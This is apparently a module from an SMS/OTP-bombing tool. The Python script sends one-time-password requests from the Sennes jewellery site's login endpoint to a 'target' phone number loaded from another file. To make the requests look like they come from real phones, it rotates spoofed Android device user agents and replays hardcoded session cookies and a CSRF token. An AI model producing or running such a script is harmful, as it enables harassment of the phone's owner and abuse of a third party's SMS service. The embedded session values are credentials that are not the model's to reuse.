import json
import random
from typing import Any
import requests

OTP_API_URL = "https://www.sennes.in/on/demandware.store/Sites-Sennes-Site/default/Login-VerifyAccount"

def get_random_device() -> dict[str, str]:
    devices = [
        {"model": "Infinix X6871", "android": "15", "chrome": "155"},
        {"model": "Samsung Galaxy S24", "android": "15", "chrome": "155"},
        {"model": "Redmi Note 13 Pro", "android": "14", "chrome": "154"},
        {"model": "POCO X6 Pro", "android": "14", "chrome": "155"},
        {"model": "Realme GT 6", "android": "15", "chrome": "154"},
        {"model": "Vivo V30", "android": "14", "chrome": "153"},
        {"model": "OnePlus Nord 4", "android": "15", "chrome": "155"},
        {"model": "Motorola Edge 50", "android": "14", "chrome": "154"},
        {"model": "iQOO Z9", "android": "14", "chrome": "155"},
        {"model": "Nothing Phone 2a", "android": "15", "chrome": "155"},
    ]

    d = random.choice(devices)
    build = f"AP3A.{240000 + random.randint(0, 8999)}.015.A2"
    chrome_full = f"{d['chrome']}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    ua = (
        f"Mozilla/5.0 (Linux; Android {d['android']}; {d['model']} Build/{build}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_full} "
        f"Mobile Safari/537.36"
    )

    sec_ch_ua = (
        f'"Android WebView";v="{d["chrome"]}", '
        f'"Chromium";v="{d["chrome"]}", '
        f'"Not(A:Brand";v="24"'
    )

    return {
        "userAgent": ua,
        "secChUa": sec_ch_ua,
        "platform": '"Android"',
        "mobile": "?1",
    }

def main() -> dict[str, Any]:
    # ===== Load number from target.py =====
    try:
        from target import NUMBER
        number = str(NUMBER).strip()
    except Exception as e:
        return {"success": False, "message": f"Failed to load NUMBER from target.py → {e}"}

    if not (number.isdigit() and len(number) == 10):
        return {"success": False, "message": f"Invalid number in target.py: {number}"}

    device = get_random_device()

    try:
        payload = {
            'csrf_token': "jFEGsSdkD7EK7F3vIYQ0j3DfUmzOBNmoka16zEkJeqhV2fepZSzx4wMxtFSOEmbCB739KbiObnciEnvQDJjsByEysG9QGoGiu9L6HtMihXvCiUkfRJjkpYHoV9MIh8x4ka_ns5BMUCN23Kq2ubyFc-kk8pE6pNpp0y3b3N8Ojf5rkqNSR1U=",
            'loginEmailOrPhone': number,
            'mobileCode': "91",
            'isPhoneNumber': "true",
            'methodUsed': "mobileNumber"
        }

        headers = {
            'User-Agent': device["userAgent"],
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': device["platform"],
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': device["secChUa"],
            'sec-ch-ua-mobile': device["mobile"],
            'origin': "https://www.sennes.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.sennes.in/collections/lab-grown-diamonds-jewellery?gad_source=1&gad_campaignid=23513186071&gbraid=0AAAABCqquqW8-atBDIAakw3QDhmYlHGZp&gclid=EAIaIQobChMI2NvNrJTelwMV06FsCR1e5AfDEAAYAyAAEgKopvD_BwE",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
            'Cookie': "dwac_314fb9398df90f4b32878fc4bb=0At5DfsCpEaC3JpkbCY7N0Vuwu_SGMKffhQ%3D|dw-only|||INR|false|Asia%2FKolkata|true; cqcid=bcMplsfw5AFs1zvSbLaUA1LXAK; cquid=||; sid=0At5DfsCpEaC3JpkbCY7N0Vuwu_SGMKffhQ; dwanonymous_f8ff55afb90520dd8eb7d305dd55cd95=bcMplsfw5AFs1zvSbLaUA1LXAK; __cq_dnt=0; dw_dnt=0; dwsid=A7vMPqRwPZun07A94r58VJbed9yNaltCWxsGNshFSrxmnDV0wCe98lB7s_9JgxATNwenVVisq7LNVLQS_Dzbew==; _pin_unauth=dWlkPU5UTTNaVGs0TXpndFpUZzFZaTAwWkdNM0xXRmhPV0V0WmpobFpXUXpORGxqWlRaaA; g_state={\"i_l\":0,\"i_ll\":1793240246221,\"i_b\":\"iNPV32BoZVvguHt3cHxSInNzYge7RFQ7ml1cz8HCgx4\",\"i_e\":{\"enable_itp_optimization\":24},\"i_et\":1793240246221}"
        }

        resp = requests.post(
            OTP_API_URL,
            headers=headers,
            data=payload,
            timeout=15,
        )

        try:
            result_data = resp.json()
        except json.JSONDecodeError:
            result_data = {"raw": resp.text}

        if resp.ok:
            return {
                "success": True,
                "message": f"OTP request sent to {number}",
                "status_code": resp.status_code,
                "data": result_data,
            }
        else:
            return {
                "success": False,
                "message": f"HTTP {resp.status_code}",
                "data": result_data,
            }

    except Exception as err:
        return {"success": False, "message": str(err)}

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2, ensure_ascii=False))
